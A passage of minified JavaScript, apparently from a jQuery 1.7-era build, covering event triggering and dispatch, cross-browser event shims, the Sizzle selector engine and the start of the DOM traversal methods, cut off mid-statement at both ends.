if(q.indexOf("!")>=0&&(q=q.slice(0,-1),h=!0),q.indexOf(".")>=0&&(r=q.split("."),q=r.shift(),r.sort()),(!e||K.event.customEvent[q])&&!K.event.global[q])return;
if(c="object"==typeof c?c[K.expando]?c:new K.Event(q,c):new K.Event(q),c.type=q,c.isTrigger=!0,c.exclusive=h,c.namespace=r.join("."),c.namespace_re=c.namespace?new RegExp("(^|\\.)"+r.join("\\.(?:.*\\.)?")+"(\\.|$)"):null,l=q.indexOf(":")<0?"on"+q:"",!e){g=K.cache;
for(i in g)g[i].events&&g[i].events[q]&&K.event.trigger(c,d,g[i].handle.elem,!0);
return}if(c.result=b,c.target||(c.target=e),d=null!=d?K.makeArray(d):[],d.unshift(c),m=K.event.special[q]||{},m.trigger&&m.trigger.apply(e,d)===!1)return;
if(o=[[e,m.bindType||q]],!f&&!m.noBubble&&!K.isWindow(e)){for(p=m.delegateType||q,j=da.test(p+q)?e:e.parentNode,k=null;
j;
j=j.parentNode)o.push([j,p]),k=j;
k&&k===e.ownerDocument&&o.push([k.defaultView||k.parentWindow||a,p])}for(i=0;
i<o.length&&!c.isPropagationStopped();
i++)j=o[i][0],c.type=o[i][1],n=(K._data(j,"events")||{})[c.type]&&K._data(j,"handle"),n&&n.apply(j,d),n=l&&j[l],n&&K.acceptData(j)&&n.apply(j,d)===!1&&c.preventDefault();
return c.type=q,!f&&!c.isDefaultPrevented()&&(!m._default||m._default.apply(e.ownerDocument,d)===!1)&&("click"!==q||!K.nodeName(e,"a"))&&K.acceptData(e)&&l&&e[q]&&("focus"!==q&&"blur"!==q||0!==c.target.offsetWidth)&&!K.isWindow(e)&&(k=e[l],k&&(e[l]=null),K.event.triggered=q,e[q](),K.event.triggered=b,k&&(e[l]=k)),c.result}},dispatch:function(c){c=K.event.fix(c||a.event);
var d,e,f,g,h,i,j,k,l,m,n=(K._data(this,"events")||{})[c.type]||[],o=n.delegateCount,p=[].slice.call(arguments,0),q=!c.exclusive&&!c.namespace,r=[];
if(p[0]=c,c.delegateTarget=this,o&&!c.target.disabled&&(!c.button||"click"!==c.type))for(g=K(this),g.context=this.ownerDocument||this,f=c.target;
f!=this;
f=f.parentNode||this){for(i={},k=[],g[0]=f,d=0;
o>d;
d++)l=n[d],m=l.selector,i[m]===b&&(i[m]=l.quick?ga(f,l.quick):g.is(m)),i[m]&&k.push(l);
k.length&&r.push({elem:f,matches:k})}for(n.length>o&&r.push({elem:this,matches:n.slice(o)}),d=0;
d<r.length&&!c.isPropagationStopped();
d++)for(j=r[d],c.currentTarget=j.elem,e=0;
e<j.matches.length&&!c.isImmediatePropagationStopped();
e++)l=j.matches[e],(q||!c.namespace&&!l.namespace||c.namespace_re&&c.namespace_re.test(l.namespace))&&(c.data=l.data,c.handleObj=l,h=((K.event.special[l.origType]||{}).handle||l.handler).apply(j.elem,p),h!==b&&(c.result=h,h===!1&&(c.preventDefault(),c.stopPropagation())));
return c.result},props:"attrChange attrName relatedNode srcElement altKey bubbles cancelable ctrlKey currentTarget eventPhase metaKey relatedTarget shiftKey target timeStamp view which".split(" "),fixHooks:{},keyHooks:{props:"char charCode key keyCode".split(" "),filter:function(a,b){return null==a.which&&(a.which=null!=b.charCode?b.charCode:b.keyCode),a}},mouseHooks:{props:"button buttons clientX clientY fromElement offsetX offsetY pageX pageY screenX screenY toElement".split(" "),filter:function(a,c){var d,e,f,g=c.button,h=c.fromElement;
return null==a.pageX&&null!=c.clientX&&(d=a.target.ownerDocument||H,e=d.documentElement,f=d.body,a.pageX=c.clientX+(e&&e.scrollLeft||f&&f.scrollLeft||0)-(e&&e.clientLeft||f&&f.clientLeft||0),a.pageY=c.clientY+(e&&e.scrollTop||f&&f.scrollTop||0)-(e&&e.clientTop||f&&f.clientTop||0)),!a.relatedTarget&&h&&(a.relatedTarget=h===a.target?c.toElement:h),!a.which&&g!==b&&(a.which=1&g?1:2&g?3:4&g?2:0),a}},fix:function(a){if(a[K.expando])return a;
var c,d,e=a,f=K.event.fixHooks[a.type]||{},g=f.props?this.props.concat(f.props):this.props;
for(a=K.Event(e),c=g.length;
c;
)d=g[--c],a[d]=e[d];
return a.target||(a.target=e.srcElement||H),3===a.target.nodeType&&(a.target=a.target.parentNode),a.metaKey===b&&(a.metaKey=a.ctrlKey),f.filter?f.filter(a,e):a},special:{ready:{setup:K.bindReady},load:{noBubble:!0},focus:{delegateType:"focusin"},blur:{delegateType:"focusout"},beforeunload:{setup:function(a,b,c){K.isWindow(this)&&(this.onbeforeunload=c)},teardown:function(a,b){this.onbeforeunload===b&&(this.onbeforeunload=null)}}},simulate:function(a,b,c,d){var e=K.extend(new K.Event,c,{type:a,isSimulated:!0,originalEvent:{}});
d?K.event.trigger(e,null,b):K.event.dispatch.call(b,e),e.isDefaultPrevented()&&c.preventDefault()}},K.event.handle=K.event.dispatch,K.removeEvent=H.removeEventListener?function(a,b,c){a.removeEventListener&&a.removeEventListener(b,c,!1)}:function(a,b,c){a.detachEvent&&a.detachEvent("on"+b,c)},K.Event=function(a,b){return this instanceof K.Event?(a&&a.type?(this.originalEvent=a,this.type=a.type,this.isDefaultPrevented=a.defaultPrevented||a.returnValue===!1||a.getPreventDefault&&a.getPreventDefault()?B:C):this.type=a,b&&K.extend(this,b),this.timeStamp=a&&a.timeStamp||K.now(),this[K.expando]=!0,void 0):new K.Event(a,b)},K.Event.prototype={preventDefault:function(){this.isDefaultPrevented=B;
var a=this.originalEvent;
!a||(a.preventDefault?a.preventDefault():a.returnValue=!1)},stopPropagation:function(){this.isPropagationStopped=B;
var a=this.originalEvent;
!a||(a.stopPropagation&&a.stopPropagation(),a.cancelBubble=!0)},stopImmediatePropagation:function(){this.isImmediatePropagationStopped=B,this.stopPropagation()},isDefaultPrevented:C,isPropagationStopped:C,isImmediatePropagationStopped:C},K.each({mouseenter:"mouseover",mouseleave:"mouseout"},function(a,b){K.event.special[a]={delegateType:b,bindType:b,handle:function(a){var c,d=this,e=a.relatedTarget,f=a.handleObj;
f.selector;
return(!e||e!==d&&!K.contains(d,e))&&(a.type=f.origType,c=f.handler.apply(this,arguments),a.type=b),c}}}),K.support.submitBubbles||(K.event.special.submit={setup:function(){return K.nodeName(this,"form")?!1:void K.event.add(this,"click._submit keypress._submit",function(a){var c=a.target,d=K.nodeName(c,"input")||K.nodeName(c,"button")?c.form:b;
d&&!d._submit_attached&&(K.event.add(d,"submit._submit",function(a){this.parentNode&&!a.isTrigger&&K.event.simulate("submit",this.parentNode,a,!0)}),d._submit_attached=!0)})},teardown:function(){return K.nodeName(this,"form")?!1:void K.event.remove(this,"._submit")}}),K.support.changeBubbles||(K.event.special.change={setup:function(){return $.test(this.nodeName)?(("checkbox"===this.type||"radio"===this.type)&&(K.event.add(this,"propertychange._change",function(a){"checked"===a.originalEvent.propertyName&&(this._just_changed=!0)}),K.event.add(this,"click._change",function(a){this._just_changed&&!a.isTrigger&&(this._just_changed=!1,K.event.simulate("change",this,a,!0))})),!1):void K.event.add(this,"beforeactivate._change",function(a){var b=a.target;
$.test(b.nodeName)&&!b._change_attached&&(K.event.add(b,"change._change",function(a){this.parentNode&&!a.isSimulated&&!a.isTrigger&&K.event.simulate("change",this.parentNode,a,!0)}),b._change_attached=!0)})},handle:function(a){var b=a.target;
return this!==b||a.isSimulated||a.isTrigger||"radio"!==b.type&&"checkbox"!==b.type?a.handleObj.handler.apply(this,arguments):void 0},teardown:function(){return K.event.remove(this,"._change"),$.test(this.nodeName)}}),K.support.focusinBubbles||K.each({focus:"focusin",blur:"focusout"},function(a,b){var c=0,d=function(a){K.event.simulate(b,a.target,K.event.fix(a),!0)};
K.event.special[b]={setup:function(){0===c++&&H.addEventListener(a,d,!0)},teardown:function(){0===--c&&H.removeEventListener(a,d,!0)}}}),K.fn.extend({on:function(a,c,d,e,f){var g,h;
if("object"==typeof a){"string"!=typeof c&&(d=c,c=b);
for(h in a)this.on(h,c,d,a[h],f);
return this}if(null==d&&null==e?(e=c,d=c=b):null==e&&("string"==typeof c?(e=d,d=b):(e=d,d=c,c=b)),e===!1)e=C;
else if(!e)return this;
return 1===f&&(g=e,e=function(a){return K().off(a),g.apply(this,arguments)},e.guid=g.guid||(g.guid=K.guid++)),this.each(function(){K.event.add(this,a,e,d,c)})},one:function(a,b,c,d){return this.on.call(this,a,b,c,d,1)},off:function(a,c,d){if(a&&a.preventDefault&&a.handleObj){var e=a.handleObj;
return K(a.delegateTarget).off(e.namespace?e.type+"."+e.namespace:e.type,e.selector,e.handler),this}if("object"==typeof a){for(var f in a)this.off(f,c,a[f]);
return this}return(c===!1||"function"==typeof c)&&(d=c,c=b),d===!1&&(d=C),this.each(function(){K.event.remove(this,a,d,c)})},bind:function(a,b,c){return this.on(a,null,b,c)},unbind:function(a,b){return this.off(a,null,b)},live:function(a,b,c){return K(this.context).on(a,this.selector,b,c),this},die:function(a,b){return K(this.context).off(a,this.selector||"**",b),this},delegate:function(a,b,c,d){return this.on(b,a,c,d)},undelegate:function(a,b,c){return 1==arguments.length?this.off(a,"**"):this.off(b,a,c)},trigger:function(a,b){return this.each(function(){K.event.trigger(a,b,this)})},triggerHandler:function(a,b){return this[0]?K.event.trigger(a,b,this[0],!0):void 0},toggle:function(a){var b=arguments,c=a.guid||K.guid++,d=0,e=function(c){var e=(K._data(this,"lastToggle"+a.guid)||0)%d;
return K._data(this,"lastToggle"+a.guid,e+1),c.preventDefault(),b[e].apply(this,arguments)||!1};
for(e.guid=c;
d<b.length;
)b[d++].guid=c;
return this.click(e)},hover:function(a,b){return this.mouseenter(a).mouseleave(b||a)}}),K.each("blur focus focusin focusout load resize scroll unload click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup error contextmenu".split(" "),function(a,b){K.fn[b]=function(a,c){return null==c&&(c=a,a=null),arguments.length>0?this.on(b,null,a,c):this.trigger(b)},K.attrFn&&(K.attrFn[b]=!0),ba.test(b)&&(K.event.fixHooks[b]=K.event.keyHooks),ca.test(b)&&(K.event.fixHooks[b]=K.event.mouseHooks)}),function(){function a(a,b,c,d,f,g){for(var h=0,i=d.length;
i>h;
h++){var j=d[h];
if(j){var k=!1;
for(j=j[a];
j;
){if(j[e]===c){k=d[j.sizset];
break}if(1===j.nodeType)if(g||(j[e]=c,j.sizset=h),"string"!=typeof b){if(j===b){k=!0;
break}}else if(m.filter(b,[j]).length>0){k=j;
break}j=j[a]}d[h]=k}}}function c(a,b,c,d,f,g){for(var h=0,i=d.length;
i>h;
h++){var j=d[h];
if(j){var k=!1;
for(j=j[a];
j;
){if(j[e]===c){k=d[j.sizset];
break}if(1===j.nodeType&&!g&&(j[e]=c,j.sizset=h),j.nodeName.toLowerCase()===b){k=j;
break}j=j[a]}d[h]=k}}}var d=/((?:\((?:\([^()]+\)|[^()]+)+\)|\[(?:\[[^\[\]]*\]|['"][^'"]*['"]|[^\[\]'"]+)+\]|\\.|[^ >+~,(\[\\]+)+|[>+~])(\s*,\s*)?((?:.|\r|\n)*)/g,e="sizcache"+(Math.random()+"").replace(".",""),f=0,g=Object.prototype.toString,h=!1,i=!0,j=/\\/g,k=/\r\n/g,l=/\W/;
[0,0].sort(function(){return i=!1,0});
var m=function(a,b,c,e){c=c||[],b=b||H;
var f=b;
if(1!==b.nodeType&&9!==b.nodeType)return[];
if(!a||"string"!=typeof a)return c;
var h,i,j,k,l,n,q,r,t=!0,u=m.isXML(b),v=[],x=a;
do if(d.exec(""),h=d.exec(x),h&&(x=h[3],v.push(h[1]),h[2])){k=h[3];
break}while(h);
if(v.length>1&&p.exec(a))if(2===v.length&&o.relative[v[0]])i=w(v[0]+v[1],b,e);
else for(i=o.relative[v[0]]?[b]:m(v.shift(),b);
v.length;
)a=v.shift(),o.relative[a]&&(a+=v.shift()),i=w(a,i,e);
else if(!e&&v.length>1&&9===b.nodeType&&!u&&o.match.ID.test(v[0])&&!o.match.ID.test(v[v.length-1])&&(l=m.find(v.shift(),b,u),b=l.expr?m.filter(l.expr,l.set)[0]:l.set[0]),b)for(l=e?{expr:v.pop(),set:s(e)}:m.find(v.pop(),1!==v.length||"~"!==v[0]&&"+"!==v[0]||!b.parentNode?b:b.parentNode,u),i=l.expr?m.filter(l.expr,l.set):l.set,v.length>0?j=s(i):t=!1;
v.length;
)n=v.pop(),q=n,o.relative[n]?q=v.pop():n="",null==q&&(q=b),o.relative[n](j,q,u);
else j=v=[];
if(j||(j=i),j||m.error(n||a),"[object Array]"===g.call(j))if(t)if(b&&1===b.nodeType)for(r=0;
null!=j[r];
r++)j[r]&&(j[r]===!0||1===j[r].nodeType&&m.contains(b,j[r]))&&c.push(i[r]);
else for(r=0;
null!=j[r];
r++)j[r]&&1===j[r].nodeType&&c.push(i[r]);
else c.push.apply(c,j);
else s(j,c);
return k&&(m(k,f,c,e),m.uniqueSort(c)),c};
m.uniqueSort=function(a){if(u&&(h=i,a.sort(u),h))for(var b=1;
b<a.length;
b++)a[b]===a[b-1]&&a.splice(b--,1);
return a},m.matches=function(a,b){return m(a,null,null,b)},m.matchesSelector=function(a,b){return m(b,null,null,[a]).length>0},m.find=function(a,b,c){var d,e,f,g,h,i;
if(!a)return[];
for(e=0,f=o.order.length;
f>e;
e++)if(h=o.order[e],(g=o.leftMatch[h].exec(a))&&(i=g[1],g.splice(1,1),"\\"!==i.substr(i.length-1)&&(g[1]=(g[1]||"").replace(j,""),d=o.find[h](g,b,c),null!=d))){a=a.replace(o.match[h],"");
break}return d||(d="undefined"!=typeof b.getElementsByTagName?b.getElementsByTagName("*"):[]),{set:d,expr:a}},m.filter=function(a,c,d,e){for(var f,g,h,i,j,k,l,n,p,q=a,r=[],s=c,t=c&&c[0]&&m.isXML(c[0]);
a&&c.length;
){for(h in o.filter)if(null!=(f=o.leftMatch[h].exec(a))&&f[2]){if(k=o.filter[h],l=f[1],g=!1,f.splice(1,1),"\\"===l.substr(l.length-1))continue;
if(s===r&&(r=[]),o.preFilter[h])if(f=o.preFilter[h](f,s,d,r,e,t)){if(f===!0)continue}else g=i=!0;
if(f)for(n=0;
null!=(j=s[n]);
n++)j&&(i=k(j,f,n,s),p=e^i,d&&null!=i?p?g=!0:s[n]=!1:p&&(r.push(j),g=!0));
if(i!==b){if(d||(s=r),a=a.replace(o.match[h],""),!g)return[];
break}}if(a===q){if(null!=g)break;
m.error(a)}q=a}return s},m.error=function(a){throw new Error("Syntax error, unrecognized expression: "+a)};
var n=m.getText=function(a){var b,c,d=a.nodeType,e="";
if(d){if(1===d||9===d){if("string"==typeof a.textContent)return a.textContent;
if("string"==typeof a.innerText)return a.innerText.replace(k,"");
for(a=a.firstChild;
a;
a=a.nextSibling)e+=n(a)}else if(3===d||4===d)return a.nodeValue}else for(b=0;
c=a[b];
b++)8!==c.nodeType&&(e+=n(c));
return e},o=m.selectors={order:["ID","NAME","TAG"],match:{ID:/#((?:[\w\u00c0-\uFFFF\-]|\\.)+)/,CLASS:/\.((?:[\w\u00c0-\uFFFF\-]|\\.)+)/,NAME:/\[name=['"]*((?:[\w\u00c0-\uFFFF\-]|\\.)+)['"]*\]/,ATTR:/\[\s*((?:[\w\u00c0-\uFFFF\-]|\\.)+)\s*(?:(\S?=)\s*(?:(['"])(.*?)\3|(#?(?:[\w\u00c0-\uFFFF\-]|\\.)*)|)|)\s*\]/,TAG:/^((?:[\w\u00c0-\uFFFF\*\-]|\\.)+)/,CHILD:/:(only|nth|last|first)-child(?:\(\s*(even|odd|(?:[+\-]?\d+|(?:[+\-]?\d*)?n\s*(?:[+\-]\s*\d+)?))\s*\))?/,POS:/:(nth|eq|gt|lt|first|last|even|odd)(?:\((\d*)\))?(?=[^\-]|$)/,PSEUDO:/:((?:[\w\u00c0-\uFFFF\-]|\\.)+)(?:\((['"]?)((?:\([^\)]+\)|[^\(\)]*)+)\2\))?/},leftMatch:{},attrMap:{"class":"className","for":"htmlFor"},attrHandle:{href:function(a){return a.getAttribute("href")},type:function(a){return a.getAttribute("type")}},relative:{"+":function(a,b){var c="string"==typeof b,d=c&&!l.test(b),e=c&&!d;
d&&(b=b.toLowerCase());
for(var f,g=0,h=a.length;
h>g;
g++)if(f=a[g]){for(;
(f=f.previousSibling)&&1!==f.nodeType;
);
a[g]=e||f&&f.nodeName.toLowerCase()===b?f||!1:f===b}e&&m.filter(b,a,!0)},">":function(a,b){var c,d="string"==typeof b,e=0,f=a.length;
if(d&&!l.test(b)){for(b=b.toLowerCase();
f>e;
e++)if(c=a[e]){var g=c.parentNode;
a[e]=g.nodeName.toLowerCase()===b?g:!1}}else{for(;
f>e;
e++)c=a[e],c&&(a[e]=d?c.parentNode:c.parentNode===b);
d&&m.filter(b,a,!0)}},"":function(b,d,e){var g,h=f++,i=a;
"string"==typeof d&&!l.test(d)&&(d=d.toLowerCase(),g=d,i=c),i("parentNode",d,h,b,g,e)},"~":function(b,d,e){var g,h=f++,i=a;
"string"==typeof d&&!l.test(d)&&(d=d.toLowerCase(),g=d,i=c),i("previousSibling",d,h,b,g,e)}},find:{ID:function(a,b,c){if("undefined"!=typeof b.getElementById&&!c){var d=b.getElementById(a[1]);
return d&&d.parentNode?[d]:[]}},NAME:function(a,b){if("undefined"!=typeof b.getElementsByName){for(var c=[],d=b.getElementsByName(a[1]),e=0,f=d.length;
f>e;
e++)d[e].getAttribute("name")===a[1]&&c.push(d[e]);
return 0===c.length?null:c}},TAG:function(a,b){return"undefined"!=typeof b.getElementsByTagName?b.getElementsByTagName(a[1]):void 0}},preFilter:{CLASS:function(a,b,c,d,e,f){if(a=" "+a[1].replace(j,"")+" ",f)return a;
for(var g,h=0;
null!=(g=b[h]);
h++)g&&(e^(g.className&&(" "+g.className+" ").replace(/[\t\n\r]/g," ").indexOf(a)>=0)?c||d.push(g):c&&(b[h]=!1));
return!1},ID:function(a){return a[1].replace(j,"")},TAG:function(a,b){return a[1].replace(j,"").toLowerCase()},CHILD:function(a){if("nth"===a[1]){a[2]||m.error(a[0]),a[2]=a[2].replace(/^\+|\s*/g,"");
var b=/(-?)(\d*)(?:n([+\-]?\d*))?/.exec("even"===a[2]&&"2n"||"odd"===a[2]&&"2n+1"||!/\D/.test(a[2])&&"0n+"+a[2]||a[2]);
a[2]=b[1]+(b[2]||1)-0,a[3]=b[3]-0}else a[2]&&m.error(a[0]);
return a[0]=f++,a},ATTR:function(a,b,c,d,e,f){var g=a[1]=a[1].replace(j,"");
return!f&&o.attrMap[g]&&(a[1]=o.attrMap[g]),a[4]=(a[4]||a[5]||"").replace(j,""),"~="===a[2]&&(a[4]=" "+a[4]+" "),a},PSEUDO:function(a,b,c,e,f){if("not"===a[1]){if(!((d.exec(a[3])||"").length>1||/^\w/.test(a[3]))){var g=m.filter(a[3],b,c,!0^f);
return c||e.push.apply(e,g),!1}a[3]=m(a[3],null,null,b)}else if(o.match.POS.test(a[0])||o.match.CHILD.test(a[0]))return!0;
return a},POS:function(a){return a.unshift(!0),a}},filters:{enabled:function(a){return a.disabled===!1&&"hidden"!==a.type},disabled:function(a){return a.disabled===!0},checked:function(a){return a.checked===!0},selected:function(a){return a.parentNode&&a.parentNode.selectedIndex,a.selected===!0},parent:function(a){return!!a.firstChild},empty:function(a){return!a.firstChild},has:function(a,b,c){return!!m(c[3],a).length},header:function(a){return/h\d/i.test(a.nodeName)},text:function(a){var b=a.getAttribute("type"),c=a.type;
return"input"===a.nodeName.toLowerCase()&&"text"===c&&(b===c||null===b)},radio:function(a){return"input"===a.nodeName.toLowerCase()&&"radio"===a.type},checkbox:function(a){return"input"===a.nodeName.toLowerCase()&&"checkbox"===a.type},file:function(a){return"input"===a.nodeName.toLowerCase()&&"file"===a.type},password:function(a){return"input"===a.nodeName.toLowerCase()&&"password"===a.type},submit:function(a){var b=a.nodeName.toLowerCase();
return("input"===b||"button"===b)&&"submit"===a.type},image:function(a){return"input"===a.nodeName.toLowerCase()&&"image"===a.type},reset:function(a){var b=a.nodeName.toLowerCase();
return("input"===b||"button"===b)&&"reset"===a.type},button:function(a){var b=a.nodeName.toLowerCase();
return"input"===b&&"button"===a.type||"button"===b},input:function(a){return/input|select|textarea|button/i.test(a.nodeName)},focus:function(a){return a===a.ownerDocument.activeElement}},setFilters:{first:function(a,b){return 0===b},last:function(a,b,c,d){return b===d.length-1},even:function(a,b){return b%2===0},odd:function(a,b){return b%2===1},lt:function(a,b,c){return b<c[3]-0},gt:function(a,b,c){return b>c[3]-0},nth:function(a,b,c){return c[3]-0===b},eq:function(a,b,c){return c[3]-0===b}},filter:{PSEUDO:function(a,b,c,d){var e=b[1],f=o.filters[e];
if(f)return f(a,c,b,d);
if("contains"===e)return(a.textContent||a.innerText||n([a])||"").indexOf(b[3])>=0;
if("not"===e){for(var g=b[3],h=0,i=g.length;
i>h;
h++)if(g[h]===a)return!1;
return!0}m.error(e)},CHILD:function(a,b){var c,d,f,g,h,i,j=b[1],k=a;
switch(j){case"only":case"first":for(;
k=k.previousSibling;
)if(1===k.nodeType)return!1;
if("first"===j)return!0;
k=a;
case"last":for(;
k=k.nextSibling;
)if(1===k.nodeType)return!1;
return!0;
case"nth":if(c=b[2],d=b[3],1===c&&0===d)return!0;
if(f=b[0],g=a.parentNode,g&&(g[e]!==f||!a.nodeIndex)){for(h=0,k=g.firstChild;
k;
k=k.nextSibling)1===k.nodeType&&(k.nodeIndex=++h);
g[e]=f}return i=a.nodeIndex-d,0===c?0===i:i%c===0&&i/c>=0}},ID:function(a,b){return 1===a.nodeType&&a.getAttribute("id")===b},TAG:function(a,b){return"*"===b&&1===a.nodeType||!!a.nodeName&&a.nodeName.toLowerCase()===b},CLASS:function(a,b){return(" "+(a.className||a.getAttribute("class"))+" ").indexOf(b)>-1},ATTR:function(a,b){var c=b[1],d=m.attr?m.attr(a,c):o.attrHandle[c]?o.attrHandle[c](a):null!=a[c]?a[c]:a.getAttribute(c),e=d+"",f=b[2],g=b[4];
return null==d?"!="===f:!f&&m.attr?null!=d:"="===f?e===g:"*="===f?e.indexOf(g)>=0:"~="===f?(" "+e+" ").indexOf(g)>=0:g?"!="===f?e!==g:"^="===f?0===e.indexOf(g):"$="===f?e.substr(e.length-g.length)===g:"|="===f?e===g||e.substr(0,g.length+1)===g+"-":!1:e&&d!==!1},POS:function(a,b,c,d){var e=b[2],f=o.setFilters[e];
return f?f(a,c,b,d):void 0}}},p=o.match.POS,q=function(a,b){return"\\"+(b-0+1)};
for(var r in o.match)o.match[r]=new RegExp(o.match[r].source+/(?![^\[]*\])(?![^\(]*\))/.source),o.leftMatch[r]=new RegExp(/(^(?:.|\r|\n)*?)/.source+o.match[r].source.replace(/\\(\d+)/g,q));
var s=function(a,b){return a=Array.prototype.slice.call(a,0),b?(b.push.apply(b,a),b):a};
try{Array.prototype.slice.call(H.documentElement.childNodes,0)[0].nodeType}catch(t){s=function(a,b){var c=0,d=b||[];
if("[object Array]"===g.call(a))Array.prototype.push.apply(d,a);
else if("number"==typeof a.length)for(var e=a.length;
e>c;
c++)d.push(a[c]);
else for(;
a[c];
c++)d.push(a[c]);
return d}}var u,v;
H.documentElement.compareDocumentPosition?u=function(a,b){return a===b?(h=!0,0):a.compareDocumentPosition&&b.compareDocumentPosition?4&a.compareDocumentPosition(b)?-1:1:a.compareDocumentPosition?-1:1}:(u=function(a,b){if(a===b)return h=!0,0;
if(a.sourceIndex&&b.sourceIndex)return a.sourceIndex-b.sourceIndex;
var c,d,e=[],f=[],g=a.parentNode,i=b.parentNode,j=g;
if(g===i)return v(a,b);
if(!g)return-1;
if(!i)return 1;
for(;
j;
)e.unshift(j),j=j.parentNode;
for(j=i;
j;
)f.unshift(j),j=j.parentNode;
c=e.length,d=f.length;
for(var k=0;
c>k&&d>k;
k++)if(e[k]!==f[k])return v(e[k],f[k]);
return k===c?v(a,f[k],-1):v(e[k],b,1)},v=function(a,b,c){if(a===b)return c;
for(var d=a.nextSibling;
d;
){if(d===b)return-1;
d=d.nextSibling}return 1}),function(){var a=H.createElement("div"),c="script"+(new Date).getTime(),d=H.documentElement;
a.innerHTML="<a name='"+c+"'/>",d.insertBefore(a,d.firstChild),H.getElementById(c)&&(o.find.ID=function(a,c,d){if("undefined"!=typeof c.getElementById&&!d){var e=c.getElementById(a[1]);
return e?e.id===a[1]||"undefined"!=typeof e.getAttributeNode&&e.getAttributeNode("id").nodeValue===a[1]?[e]:b:[]}},o.filter.ID=function(a,b){var c="undefined"!=typeof a.getAttributeNode&&a.getAttributeNode("id");
return 1===a.nodeType&&c&&c.nodeValue===b}),d.removeChild(a),d=a=null}(),function(){var a=H.createElement("div");
a.appendChild(H.createComment("")),a.getElementsByTagName("*").length>0&&(o.find.TAG=function(a,b){var c=b.getElementsByTagName(a[1]);
if("*"===a[1]){for(var d=[],e=0;
c[e];
e++)1===c[e].nodeType&&d.push(c[e]);
c=d}return c}),a.innerHTML="<a href='#'></a>",a.firstChild&&"undefined"!=typeof a.firstChild.getAttribute&&"#"!==a.firstChild.getAttribute("href")&&(o.attrHandle.href=function(a){return a.getAttribute("href",2)}),a=null}(),H.querySelectorAll&&function(){var a=m,b=H.createElement("div"),c="__sizzle__";
if(b.innerHTML="<p class='TEST'></p>",!b.querySelectorAll||0!==b.querySelectorAll(".TEST").length){m=function(b,d,e,f){if(d=d||H,!f&&!m.isXML(d)){var g=/^(\w+$)|^\.([\w\-]+$)|^#([\w\-]+$)/.exec(b);
if(g&&(1===d.nodeType||9===d.nodeType)){if(g[1])return s(d.getElementsByTagName(b),e);
if(g[2]&&o.find.CLASS&&d.getElementsByClassName)return s(d.getElementsByClassName(g[2]),e)}if(9===d.nodeType){if("body"===b&&d.body)return s([d.body],e);
if(g&&g[3]){var h=d.getElementById(g[3]);
if(!h||!h.parentNode)return s([],e);
if(h.id===g[3])return s([h],e)}try{return s(d.querySelectorAll(b),e)}catch(i){}}else if(1===d.nodeType&&"object"!==d.nodeName.toLowerCase()){var j=d,k=d.getAttribute("id"),l=k||c,n=d.parentNode,p=/^\s*[+~]/.test(b);
k?l=l.replace(/'/g,"\\$&"):d.setAttribute("id",l),p&&n&&(d=d.parentNode);
try{if(!p||n)return s(d.querySelectorAll("[id='"+l+"'] "+b),e)}catch(q){}finally{k||j.removeAttribute("id")}}}return a(b,d,e,f)};
for(var d in a)m[d]=a[d];
b=null}}(),function(){var a=H.documentElement,b=a.matchesSelector||a.mozMatchesSelector||a.webkitMatchesSelector||a.msMatchesSelector;
if(b){var c=!b.call(H.createElement("div"),"div"),d=!1;
try{b.call(H.documentElement,"[test!='']:sizzle")}catch(e){d=!0}m.matchesSelector=function(a,e){if(e=e.replace(/\=\s*([^'"\]]*)\s*\]/g,"='$1']"),!m.isXML(a))try{if(d||!o.match.PSEUDO.test(e)&&!/!=/.test(e)){var f=b.call(a,e);
if(f||!c||a.document&&11!==a.document.nodeType)return f}}catch(g){}return m(e,null,null,[a]).length>0}}}(),function(){var a=H.createElement("div");
if(a.innerHTML="<div class='test e'></div><div class='test'></div>",a.getElementsByClassName&&0!==a.getElementsByClassName("e").length){if(a.lastChild.className="e",1===a.getElementsByClassName("e").length)return;
o.order.splice(1,0,"CLASS"),o.find.CLASS=function(a,b,c){return"undefined"==typeof b.getElementsByClassName||c?void 0:b.getElementsByClassName(a[1])},a=null}}(),H.documentElement.contains?m.contains=function(a,b){return a!==b&&(a.contains?a.contains(b):!0)}:H.documentElement.compareDocumentPosition?m.contains=function(a,b){return!!(16&a.compareDocumentPosition(b))}:m.contains=function(){return!1},m.isXML=function(a){var b=(a?a.ownerDocument||a:0).documentElement;
return b?"HTML"!==b.nodeName:!1};
var w=function(a,b,c){for(var d,e=[],f="",g=b.nodeType?[b]:b;
d=o.match.PSEUDO.exec(a);
)f+=d[0],a=a.replace(o.match.PSEUDO,"");
a=o.relative[a]?a+"*":a;
for(var h=0,i=g.length;
i>h;
h++)m(a,g[h],e,c);
return m.filter(f,e)};
m.attr=K.attr,m.selectors.attrMap={},K.find=m,K.expr=m.selectors,K.expr[":"]=K.expr.filters,K.unique=m.uniqueSort,K.text=m.getText,K.isXMLDoc=m.isXML,K.contains=m.contains}();
var ia=/Until$/,ja=/^(?:parents|prevUntil|prevAll)/,ka=/,/,la=/^.[^:#\[\.,]*$/,ma=Array.prototype.slice,na=K.expr.match.POS,oa={children:!0,contents:!0,next:!0,prev:!0};
K.fn.extend({find:function(a){var b,c,d=this;
if("string"!=typeof a)return K(a).filter(function(){for(b=0,c=d.length;
c>b;
b++)if(K.contains(d[b],this))return!0});
var e,f,g,h=this.pushStack("","find",a);
for(b=0,c=this.length;
c>b;
b++)if(e=h.length,K.find(a,this[b],h),b>0)for(f=e;
f<h.length;
f++)for(g=0;
e>g;
g++)if(h[g]===h[f]){h.splice(f--,1);
break}return h},has:function(a){var b=K(a);
return this.filter(function(){for(var a=0,c=b.length;
c>a;
a++)if(K.contains(this,b[a]))return!0})},not:function(a){return this.pushStack(z(this,a,!1),"not",a)},filter:function(a){return this.pushStack(z(this,a,!0),"filter",a)},is:function(a){return!!a&&("string"==typeof a?na.test(a)?K(a,this.context).index(this[0])>=0:K.filter(a,this).length>0:this.filter(a).length>0)},closest:function(a,b){var c,d,e=[],f=this[0];
if(K.isArray(a)){for(var g=1;
f&&f.ownerDocument&&f!==b;
){for(c=0;
c<a.length;
c++)K(f).is(a[c])&&e.push({selector:a[c],elem:f,level:g});
f=f.parentNode,g++}return e}var h=na.test(a)||"string"!=typeof a?K(a,b||this.context):0;
for(c=0,d=this.length;
d>c;
c++)for(f=this[c];
f;
){if(h?h.index(f)>-1:K.find.matchesSelector(f,a)){e.push(f);
